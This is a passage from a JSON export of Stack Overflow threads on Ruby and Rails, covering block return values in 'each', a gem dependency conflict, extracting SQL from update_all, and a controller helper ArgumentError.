"creation_date": 1535646344, "post_id": 52085987, "comment_id": 91154071, "body": "@PeterCamilleri A more Ruby way would be to support <code>cat.red?</code> and then <code>cats.reject(&amp;:red?)</code> does it."}, {"owner": {"reputation": 1777, "user_id": 3353157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6168a2c2f5e3582addf6d9d70ce13749?s=128&d=identicon&r=PG", "display_name": "Peter Camilleri", "link": "https://stackoverflow.com/users/3353157/peter-camilleri"}, "edited": false, "score": 1, "creation_date": 1535679191, "post_id": 52085987, "comment_id": 91165544, "body": "I agree fully, but I wanted to keep the changes to a minimum to focus on the key change needed."}], "tags": [], "owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "is_accepted": true, "score": 1, "last_activity_date": 1535576289, "creation_date": 1535576289, "answer_id": 52085987, "question_id": 52085729, "link": "https://stackoverflow.com/questions/52085729/what-does-a-ruby-do-iteration-loop-evaluate-to/52085987#52085987", "title": "What does a ruby &#39;do&#39; iteration loop evaluate to?", "body": "<p>This is some unusual code and it depends entirely on what the <code>cats</code> method does. You can pass a block to any Ruby method and that method can get executed <em>zero more more times</em> at any point between <em>immediately and the end of the program's execution</em>.</p>\n\n<p>The return value is whatever <code>cats</code> returns, which is not clear from this snippet.</p>\n\n<p>Imagine this in JavaScript terms as that language is a lot less ambiguous:</p>\n\n<pre><code>function get_non_red_cats(cats) {\n  return cats(function(cat) {\n    return !is_cat_red?(cat);\n  }\n}\n</code></pre>\n\n<p>Where this shows that <code>cats</code> is just a function that, potentially, takes a function. It might ignore your function, too.</p>\n\n<p>Now if this is <code>cats.each</code> that changes things as that's probably the <a href=\"https://ruby-doc.org/core-2.5.0/Array.html#method-i-each\" rel=\"nofollow noreferrer\">Enumerable <code>each</code> method</a> which has well-defined behaviour.</p>\n\n<p>In that case the return value is whatever <code>cats</code> is.</p>\n"}, {"tags": [], "owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "is_accepted": false, "score": 1, "last_activity_date": 1535579425, "creation_date": 1535579425, "answer_id": 52086548, "question_id": 52085729, "link": "https://stackoverflow.com/questions/52085729/what-does-a-ruby-do-iteration-loop-evaluate-to/52086548#52086548", "title": "What does a ruby &#39;do&#39; iteration loop evaluate to?", "body": "<p>There is no loop in your code. Ruby has two kinds of loops: <code>while</code> and <code>for</code>/<code>in</code>. (Actually, the latter is just syntactic sugar for <code>each</code>.)</p>\n\n<p>In Ruby, an expression evaluates to the value of the last sub-expression evaluated inside the expression. A message send evaluates to the return value of the method that was executed as a result of the message send. The return value of a method is either explicitly the value of the <code>return</code> expression that ended the method execution or implicitly the value of the last expression evaluated inside the method body. (Note that the last expression evaluated inside the body is also what a module or class definition expression evaluates to. A method definition expression however evaluates to a <code>Symbol</code> denoting the name of the method.)</p>\n\n<p>So, what does <code>get_non_red_cats</code> return? Well, there is no <code>return</code> in it, so it returns the value of the last expression evaluated inside the method body. The last expression evaluated inside the method body is a message send of the message <code>each</code> to the object referenced by the parameter binding <code>cats</code>. Ergo, the return value of <code>get_non_red_cats</code> is the return value of the method that gets executed as a result of sending the <code>each</code> message to <code>cats</code>.</p>\n\n<p>And that is all we positively <em>know</em>.</p>\n\n<p>We can make some <em>assumptions</em>, though. In general, <code>each</code> <em>should</em> return <code>self</code>. That's what all implementations of <code>each</code> in the entire core library and standard library do, and it is part of the standard \"<strong>Iterable</strong>\" Protocol in Ruby. It would be highly unusual and highly confusing if that were not the case. So, we can <em>assume</em> that whatever implementation of <code>each</code> ends up being executed, it will return <code>self</code>, i.e. the receiver of the message send, i.e. the object referenced by the parameter binding <code>cats</code>.</p>\n\n<p>In other words: the method <code>get_non_red_cats</code> simply returns whatever was passed in as an argument. It is a pretty boring method. In fact, it is the <em>identity method</em>, which is pretty much the most boring method possible.</p>\n\n<p>However, it <em>could</em> have a side-effect. You didn't ask about side-effects, only the return value, but let's look at it anyway.</p>\n\n<p>Since <code>each</code> is supposed to simply return its receiver, it is in some sense also an <em>identity method</em> and thus extremely boring. <em>However</em>, <code>each</code> is generally supposed to evaluate the block it is passed, passing each element of the collection in turn as an argument. But, it ignores the value that the block evaluates to; the block is evaluated purely for its side-effect. Note that <code>each</code> with a block that has no side-effect makes no sense whatsoever. If the block has no side-effect, then the only thing interesting about the block is its value, but <code>each</code> <em>ignores</em> the block's value, and simply returns <code>self</code>.</p>\n\n<pre><code>foo.each do\n  # something that has no side-effect\nend\n</code></pre>\n\n<p>is fully equivalent to </p>\n\n<pre><code>foo\n</code></pre>\n\n<p>Another Ruby convention is that message sends that end in a question mark <code>?</code> should be used for asking questions (duh!) I.e. a message send that ends in a question mark should return something that is suitable to used as a conditional. It also generally shouldn't have a side-effect. (This is called the <em>Command-Query Separation Principle</em> and is a fundamental design principle of Object-Oriented Software Construction.)</p>\n\n<p>And lastly, the <code>!</code> unary prefix operator, when applied to something that is intended to be used in a conditional (i.e. a boolean value or something equivalent) is generally not supposed to have side-effect. Ergo, since the message send in the block ends with a question mark, it is not supposed to have a side-effect, and the <code>!</code> operator is also not supposed to have a side-effect, we can assume that the entire block has no side-effect.</p>\n\n<p>This, in turn, means that <code>each</code> shouldn't have a side-effect, and thus <code>get_non_red_cats</code> doesn't have a side-effect. As a result, the only <em>other</em> thing <code>get_non_red_cats</code> can do, is return a value, and it very likely simply returns the value that was passed in.</p>\n\n<p>Ergo, the entire method is equivalent to </p>\n\n<pre><code>def get_non_red_cats(cats)\n  cats\nend\n</code></pre>\n\n<p>All of this is <em>assuming</em> that the author followed standard Ruby conventions. If she didn't, then this method could do and return <em>anything</em> whatsoever, it could format your harddrive, launch a nuclear attack, return <code>42</code>, or do absolutely nothing at all.</p>\n"}], "owner": {"reputation": 213, "user_id": 4991495, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c241280e70e01ad24004d19fbe21756b?s=128&d=identicon&r=PG&f=1", "display_name": "Theodore", "link": "https://stackoverflow.com/users/4991495/theodore"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "accepted_answer_id": 52085987, "answer_count": 2, "score": 1, "last_activity_date": 1535609393, "creation_date": 1535575087, "last_edit_date": 1535609393, "question_id": 52085729, "link": "https://stackoverflow.com/questions/52085729/what-does-a-ruby-do-iteration-loop-evaluate-to", "title": "What does a ruby &#39;do&#39; iteration loop evaluate to?", "body": "<p>I have the following ruby method: a single <code>do</code> iteration without any <code>break</code>, <code>next</code>, or <code>return</code>. Here, <code>cats</code> is an array of cat objects; <code>is_cat_red</code> evaluates to <code>true</code> if cat has a color property of red.</p>\n\n<pre><code>def get_non_red_cats cats\n  cats.each do |cat|\n    !is_cat_red?(cat)\n  end\nend\n</code></pre>\n\n<p>What does the method return (what does the loop evaluate to)?</p>\n"}, {"tags": ["ruby", "rubygems"], "answers": [{"comments": [{"owner": {"reputation": 199, "user_id": 5419227, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/j4eXG.jpg?s=128&g=1", "display_name": "seleniumappiumnewbie", "link": "https://stackoverflow.com/users/5419227/seleniumappiumnewbie"}, "edited": false, "score": 0, "creation_date": 1548824881, "post_id": 54431184, "comment_id": 95676773, "body": "It&#39;s been awhile since I looked at this. I have no Ruby background, but was trying to setup a build machine in QA and it required a lot of Ruby setup. We put this on pause after several of us ran into this roadblock. Thanks for responding."}], "tags": [], "owner": {"reputation": 1, "user_id": 9553154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6518a6069f1fcc94bc857183b4448597?s=128&d=identicon&r=PG&f=1", "display_name": "Alx", "link": "https://stackoverflow.com/users/9553154/alx"}, "is_accepted": false, "score": -1, "last_activity_date": 1548804505, "creation_date": 1548804505, "answer_id": 54431184, "question_id": 52084291, "link": "https://stackoverflow.com/questions/52084291/unable-to-activate-aws-sdk-v1-1-67-0-because-json-2-1-0-conflicts-with-json/54431184#54431184", "title": "Unable to activate aws-sdk-v1-1.67.0, because json-2.1.0 conflicts with json (~&gt; 1.4) (Gem::ConflictError)", "body": "<p>There is no information about your project provided. I suppose that you are using a Rails/Capistrano/AWS (as I do) and this solved my problem:</p>\n\n<p>Use this gem instead of <a href=\"https://github.com/fernandocarletti/capistrano-aws\" rel=\"nofollow noreferrer\">https://github.com/fernandocarletti/capistrano-aws</a></p>\n\n<p>this <a href=\"https://github.com/forward3d/cap-ec2\" rel=\"nofollow noreferrer\">https://github.com/forward3d/cap-ec2</a></p>\n"}], "owner": {"reputation": 199, "user_id": 5419227, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/j4eXG.jpg?s=128&g=1", "display_name": "seleniumappiumnewbie", "link": "https://stackoverflow.com/users/5419227/seleniumappiumnewbie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 358, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1548804505, "creation_date": 1535568618, "question_id": 52084291, "link": "https://stackoverflow.com/questions/52084291/unable-to-activate-aws-sdk-v1-1-67-0-because-json-2-1-0-conflicts-with-json", "title": "Unable to activate aws-sdk-v1-1.67.0, because json-2.1.0 conflicts with json (~&gt; 1.4) (Gem::ConflictError)", "body": "<p>Does anyone know how to solve this ruby error?\nI tried searching for answers, but not much information came up on google.\nAnyone have any ideas how to fix this?</p>\n\n<pre><code>    computer:adminsite abc$ ruby script/build.rb -a ~/Library/Android/sdk/ -t -v -p -f -c HJMKCT8H -s /Users/abc/code/cloudTv/OneMainstream/ -b /tmp/ -d amazon_fire_tv\nTraceback (most recent call last):\n    12: from script/build.rb:12:in `&lt;main&gt;'\n    11: from /Users/abc/.rvm/rubies/ruby-2.5.1/lib/ruby/site_ruby/2.5.0/rubygems/core_ext/kernel_require.rb:59:in `require'\n    10: from /Users/abc/.rvm/rubies/ruby-2.5.1/lib/ruby/site_ruby/2.5.0/rubygems/core_ext/kernel_require.rb:59:in `require'\n     9: from /Users/abc/1ms-platform-master/adminsite/lib/build.rb:13:in `&lt;top (required)&gt;'\n     8: from /Users/abc/.rvm/rubies/ruby-2.5.1/lib/ruby/site_ruby/2.5.0/rubygems/core_ext/kernel_require.rb:59:in `require'\n     7: from /Users/abc/.rvm/rubies/ruby-2.5.1/lib/ruby/site_ruby/2.5.0/rubygems/core_ext/kernel_require.rb:59:in `require'\n     6: from /Users/abc/1ms-platform-master/adminsite/lib/amz/s3.rb:2:in `&lt;top (required)&gt;'\n     5: from /Users/abc/.rvm/rubies/ruby-2.5.1/lib/ruby/site_ruby/2.5.0/rubygems/core_ext/kernel_require.rb:39:in `require'\n     4: from /Users/abc/.rvm/rubies/ruby-2.5.1/lib/ruby/site_ruby/2.5.0/rubygems/core_ext/kernel_require.rb:128:in `rescue in require'\n     3: from /Users/abc/.rvm/rubies/ruby-2.5.1/lib/ruby/site_ruby/2.5.0/rubygems.rb:217:in `try_activate'\n     2: from /Users/abc/.rvm/rubies/ruby-2.5.1/lib/ruby/site_ruby/2.5.0/rubygems.rb:224:in `rescue in try_activate'\n     1: from /Users/abc/.rvm/rubies/ruby-2.5.1/lib/ruby/site_ruby/2.5.0/rubygems/specification.rb:1441:in `activate'\n/Users/abc/.rvm/rubies/ruby-2.5.1/lib/ruby/site_ruby/2.5.0/rubygems/specification.rb:2332:in `raise_if_conflicts': Unable to activate aws-sdk-v1-1.67.0, because json-2.1.0 conflicts with json (~&gt; 1.4) (Gem::ConflictError)\ncomputer:adminsite abc$\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-3", "rails-activerecord"], "comments": [{"owner": {"reputation": 1999, "user_id": 1116381, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/7b470e79f9eb14c32bc0b8f3eb47fbd8?s=128&d=identicon&r=PG", "display_name": "Tachyons", "link": "https://stackoverflow.com/users/1116381/tachyons"}, "edited": false, "score": 0, "creation_date": 1535569527, "post_id": 52083516, "comment_id": 91119238, "body": "See <a href=\"https://stackoverflow.com/questions/1629351/log-every-sql-query-to-database-in-rails/1629474#1629474\" title=\"log every sql query to database in rails\">stackoverflow.com/questions/1629351/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 69, "user_id": 9803237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/549ea1590447cf15756fd4835f8403b8?s=128&d=identicon&r=PG&f=1", "display_name": "D1D2D3D4D5", "link": "https://stackoverflow.com/users/9803237/d1d2d3d4d5"}, "edited": false, "score": 0, "creation_date": 1535642888, "post_id": 52088769, "comment_id": 91151952, "body": "I was thinking this Max, thanks for the confirmation."}], "tags": [], "owner": {"reputation": 75558, "user_id": 544825, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UFdOO.png?s=128&g=1", "display_name": "max", "link": "https://stackoverflow.com/users/544825/max"}, "is_accepted": true, "score": 2, "last_activity_date": 1535599438, "last_edit_date": 1535599438, "creation_date": 1535599078, "answer_id": 52088769, "question_id": 52083516, "link": "https://stackoverflow.com/questions/52083516/how-to-access-raw-sql-statement-generated-by-update-all-activerecord-method/52088769#52088769", "title": "How to access raw SQL statement generated by update_all (ActiveRecord method)", "body": "<p>If you look at the way <code>update_all</code> <a href=\"https://github.com/rails/rails/blob/fc5dd0b85189811062c85520fd70de8389b55aeb/activerecord/lib/active_record/relation.rb#L315\" rel=\"nofollow noreferrer\">is implemented</a> you can't call <code>to_sql</code> on it like you can on relations since it executes directly and returns an integer (the number of rows executed).</p>\n\n<p>There is no way to tap into the flow or get the desired result except by duplicating the entire method and changing the last line:</p>\n\n<pre><code>module ActiveRecord\n  # = Active Record \\Relation\n  class Relation\n    def update_all_to_sql(updates)\n      raise ArgumentError, \"Empty list of attributes to change\" if updates.blank?\n\n      if eager_loading?\n        relation = apply_join_dependency\n        return relation.update_all(updates)\n      end\n\n      stmt = Arel::UpdateManager.new\n\n      stmt.set Arel.sql(@klass.sanitize_sql_for_assignment(updates))\n      stmt.table(table)\n\n      if has_join_values? || offset_value\n        @klass.connection.join_to_update(stmt, arel, arel_attribute(primary_key))\n      else\n        stmt.key = arel_attribute(primary_key)\n        stmt.take(arel.limit)\n        stmt.order(*arel.orders)\n        stmt.wheres = arel.constraints\n      end\n\n      #- @klass.connection.update stmt, \"#{@klass} Update All\"\n      stmt.to_sql\n    end\n  end\nend\n</code></pre>\n\n<p>The reason you see the log statements is that they are logged by the connection when it executes the statements. While you can override the logging its not really possible to do it for calls from a single AR method. </p>\n"}, {"tags": [], "owner": {"reputation": 2501, "user_id": 1957884, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f19ca5256db38e69603554a7bf273021?s=128&d=identicon&r=PG", "display_name": "jvalanen", "link": "https://stackoverflow.com/users/1957884/jvalanen"}, "is_accepted": false, "score": 1, "last_activity_date": 1563362144, "creation_date": 1563362144, "answer_id": 57074589, "question_id": 52083516, "link": "https://stackoverflow.com/questions/52083516/how-to-access-raw-sql-statement-generated-by-update-all-activerecord-method/57074589#57074589", "title": "How to access raw SQL statement generated by update_all (ActiveRecord method)", "body": "<p>If you have set <code>RAILS_LOG_LEVEL=debug</code> Rails shows you which SQL statement it executed.</p>\n\n<pre><code># Start Rails console in debug mode\n$ RAILS_LOG_LEVEL=debug rails c\n\n# Run your query\n[1] pry(main)&gt; Something.update_all( [\"to_update = ?\"], [\"id = ?\" my_id] )\nSQL (619.8ms) UPDATE \"somethings\" WHERE id = 123 SET to_update = my_id;\n\n# ^it prints out the query it executed\n</code></pre>\n"}], "owner": {"reputation": 69, "user_id": 9803237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/549ea1590447cf15756fd4835f8403b8?s=128&d=identicon&r=PG&f=1", "display_name": "D1D2D3D4D5", "link": "https://stackoverflow.com/users/9803237/d1d2d3d4d5"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 951, "favorite_count": 0, "accepted_answer_id": 52088769, "answer_count": 2, "score": 2, "last_activity_date": 1563362144, "creation_date": 1535565202, "last_edit_date": 1537215492, "question_id": 52083516, "link": "https://stackoverflow.com/questions/52083516/how-to-access-raw-sql-statement-generated-by-update-all-activerecord-method", "title": "How to access raw SQL statement generated by update_all (ActiveRecord method)", "body": "<p>I'm just wondering if there's a way to access the raw SQL that's executed for an update_all ActiveRecord request. As an example, take the simple example below:</p>\n\n<pre><code>Something.update_all( [\"to_update = ?\"], [\"id = ?\" my_id] )\n</code></pre>\n\n<p>In the rails console I can see the raw SQL statement so I'm guessing it's available for me to access in some way?</p>\n\n<p><em>PS - I'm specifically interested in update_all and can't change it to anything else.</em></p>\n\n<p>Thanks!</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "forms", "ruby-on-rails-5", "jquery-select2"], "comments": [{"owner": {"reputation": 4600, "user_id": 5961578, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/df7cbfdd2a92a7926af3bbb8648318aa?s=128&d=identicon&r=PG", "display_name": "moveson", "link": "https://stackoverflow.com/users/5961578/moveson"}, "edited": false, "score": 0, "creation_date": 1535563487, "post_id": 52082932, "comment_id": 91116385, "body": "When you submit the form, what do the parameters look like in the server logs? It should look like: <code>Started PATCH ... Processing by SomeController#action as HTML ... Parameters: {...}</code>. Please update your answer to show this information."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1535564670, "post_id": 52082932, "comment_id": 91116962, "body": "<code>@country = Country.new</code> What is this for? As far as I can tell, it serves no purpose. <code>@selected = Country.where(status: &#39;1&#39;)</code> -- That&#39;s not reading the submitted form data at all. When you click &quot;submit&quot;, the selected countries should be present in the <code>params</code>."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1535564834, "post_id": 52082932, "comment_id": 91117057, "body": "You should be able to do <i>something along the lines of</i> <code>Country.where(id: params[:countries][:ids]).update_all(status: :active)</code> --- but I cannot give an exact answer without knowing more details - like, what is <code>params</code>, and how do you propose to update the model? (Also, can updating the status fail - e.g. a validation? If so, how would you expect to handle the failure?)"}], "owner": {"reputation": 1, "user_id": 9496119, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ee15736ca3d3c29e3e15749b4b0de54d?s=128&d=identicon&r=PG&f=1", "display_name": "user9496119", "link": "https://stackoverflow.com/users/9496119/user9496119"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 193, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1535563070, "creation_date": 1535562960, "last_edit_date": 1535563070, "question_id": 52082932, "link": "https://stackoverflow.com/questions/52082932/rails-multiple-select-update-all-objects-of-model", "title": "Rails - Multiple Select Update all objects of model", "body": "<p>I have a 'country' model in my app with attributes name and status. If a country is activated, its status will be 1. Admin type of user can toggle this so I have given a multiple select dropdown for the same. My problem, how to update all the selected/unselected countries at one hit of submit button ?</p>\n\n<p>My form on settings page for Admin user - </p>\n\n<pre><code>&lt;%= simple_form_for @country do |form| %&gt;\n      &lt;%= form.collection_select :name, Country.order(:name), :id, :name, {:selected =&gt; @selected}, {:multiple =&gt; true, :class =&gt;\"ui fluid  selection dropdown\"}  %&gt;\n      &lt;%= form.submit 'Submit' %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>Controller -</p>\n\n<pre><code>def settings\n  @country = Country.new\n  @selected = Country.where(status: '1').pluck(:id)\nend\n</code></pre>\n\n<p>And the script - </p>\n\n<pre><code>&lt;script&gt;\n$(document).on('turbolinks:load', function() {\n    $('.ui.dropdown').dropdown();\n});\n</code></pre>\n\n<p></p>\n"}, {"tags": ["ruby-on-rails", "ruby", "parameters", "controller"], "comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535556614, "post_id": 52081173, "comment_id": 91112505, "body": "<code>signed_in?</code> \u2192 <code>signed_in?(current_user)</code>."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535556854, "post_id": 52081173, "comment_id": 91112670, "body": "@mudasobwa: I am pretty sure that it&#39;s implemented like this: <code>def signed_in?; !!current_user; end</code>"}, {"owner": {"reputation": 39, "user_id": 9387840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27d4a0322841f2d910f39c2cb9c36ecb?s=128&d=identicon&r=PG&f=1", "display_name": "Ant-IWH", "link": "https://stackoverflow.com/users/9387840/ant-iwh"}, "edited": false, "score": 0, "creation_date": 1535556908, "post_id": 52081173, "comment_id": 91112706, "body": "The signed_in? is not the issue as far as I&#39;m aware, it&#39;s the second part that breaks it for the manager."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1535556947, "post_id": 52081173, "comment_id": 91112743, "body": "Show the full error message, complete with backtrace and whatnot."}, {"owner": {"reputation": 39, "user_id": 9387840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27d4a0322841f2d910f39c2cb9c36ecb?s=128&d=identicon&r=PG&f=1", "display_name": "Ant-IWH", "link": "https://stackoverflow.com/users/9387840/ant-iwh"}, "edited": false, "score": 0, "creation_date": 1535557010, "post_id": 52081173, "comment_id": 91112796, "body": "Editing the post now to include the full message"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1535557014, "post_id": 52081173, "comment_id": 91112801, "body": "Do you have [custom] method <code>params</code> in your controller?"}, {"owner": {"reputation": 39, "user_id": 9387840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27d4a0322841f2d910f39c2cb9c36ecb?s=128&d=identicon&r=PG&f=1", "display_name": "Ant-IWH", "link": "https://stackoverflow.com/users/9387840/ant-iwh"}, "edited": false, "score": 0, "creation_date": 1535557210, "post_id": 52081173, "comment_id": 91112923, "body": "Added, I think I&#39;m just not properly passing parameters, a bit of lack of experience with rails. And what do you mean by custom method params?"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1535557393, "post_id": 52081173, "comment_id": 91113043, "body": "@Ant-IWH Is there a definition of method <code>params</code> in your controller? If so, show it."}, {"owner": {"reputation": 39, "user_id": 9387840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27d4a0322841f2d910f39c2cb9c36ecb?s=128&d=identicon&r=PG&f=1", "display_name": "Ant-IWH", "link": "https://stackoverflow.com/users/9387840/ant-iwh"}, "edited": false, "score": 0, "creation_date": 1535557512, "post_id": 52081173, "comment_id": 91113117, "body": "the only place I use params is where I wrote in my post"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535557604, "post_id": 52081173, "comment_id": 91113189, "body": "Just remove <code>manager_param = params[:manager_param]</code> line and everything should work."}, {"owner": {"reputation": 39, "user_id": 9387840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27d4a0322841f2d910f39c2cb9c36ecb?s=128&d=identicon&r=PG&f=1", "display_name": "Ant-IWH", "link": "https://stackoverflow.com/users/9387840/ant-iwh"}, "edited": false, "score": 0, "creation_date": 1535558058, "post_id": 52081173, "comment_id": 91113486, "body": "Unfortunately I&#39;m still getting the same error"}], "answers": [{"comments": [{"owner": {"reputation": 39, "user_id": 9387840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27d4a0322841f2d910f39c2cb9c36ecb?s=128&d=identicon&r=PG&f=1", "display_name": "Ant-IWH", "link": "https://stackoverflow.com/users/9387840/ant-iwh"}, "edited": false, "score": 0, "creation_date": 1535558167, "post_id": 52081479, "comment_id": 91113567, "body": "After trying the first change, I am still receiving the same wrong number of arguments (given 0, expected 1) error. Once I have this sorted out I will be moving it over to the user model properly"}], "tags": [], "owner": {"reputation": 13378, "user_id": 1430810, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v669u.jpg?s=128&g=1", "display_name": "arieljuod", "link": "https://stackoverflow.com/users/1430810/arieljuod"}, "is_accepted": false, "score": 0, "last_activity_date": 1535557620, "creation_date": 1535557620, "answer_id": 52081479, "question_id": 52081173, "link": "https://stackoverflow.com/questions/52081173/argumenterror-wrong-number-of-arguments-given-0-expected-1-when-trying-to-pa/52081479#52081479", "title": "ArgumentError: Wrong Number of Arguments (given 0, expected 1) When trying to pass params to application_controller", "body": "<p>Try this</p>\n\n<pre><code>def is_manager(manager_param)\n  \"Manager\" == manager_param\nend\n</code></pre>\n\n<p>What's wrong on your code is that you are passing <code>current_user.user_type</code> as <code>manager_param</code> and then doing <code>manager_param = params[:manager_param]</code> that tries to assign a value to the user type which I think you don't want to do.</p>\n\n<p>Also, you can ignore \"return true if\" since the condition you are checking actually returns true if true and false if false.</p>\n\n<p>Also, you should move that logic to the user model:</p>\n\n<pre><code>def is_manager?\n  'Manager' == user_type\nend\n</code></pre>\n\n<p>and then your helper could be</p>\n\n<pre><code>def is_manager?\n  current_user.is_manager?\nend\n</code></pre>\n\n<p>and you don't need to pass the current user since already available on that context.</p>\n"}, {"comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1535560093, "post_id": 52081976, "comment_id": 91114635, "body": "This is why providing a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> in a question is very important. We had no chance of guessing this."}, {"owner": {"reputation": 39, "user_id": 9387840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27d4a0322841f2d910f39c2cb9c36ecb?s=128&d=identicon&r=PG&f=1", "display_name": "Ant-IWH", "link": "https://stackoverflow.com/users/9387840/ant-iwh"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1535564939, "post_id": 52081976, "comment_id": 91117110, "body": "That was my bad, as I&#39;ve only recently been working heavily in ruby these last couple of months, I did not think to check that out."}], "tags": [], "owner": {"reputation": 39, "user_id": 9387840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27d4a0322841f2d910f39c2cb9c36ecb?s=128&d=identicon&r=PG&f=1", "display_name": "Ant-IWH", "link": "https://stackoverflow.com/users/9387840/ant-iwh"}, "is_accepted": false, "score": 1, "last_activity_date": 1535559321, "creation_date": 1535559321, "answer_id": 52081976, "question_id": 52081173, "link": "https://stackoverflow.com/questions/52081173/argumenterror-wrong-number-of-arguments-given-0-expected-1-when-trying-to-pa/52081976#52081976", "title": "ArgumentError: Wrong Number of Arguments (given 0, expected 1) When trying to pass params to application_controller", "body": "<p>Welp, I figured it out, I derped a bit. \nI was right for everything I was doing, but I was putting the def in the before_action rather than as a helper_method.</p>\n\n<p>Final code:</p>\n\n<p>Application controller:</p>\n\n<pre><code>helper_method 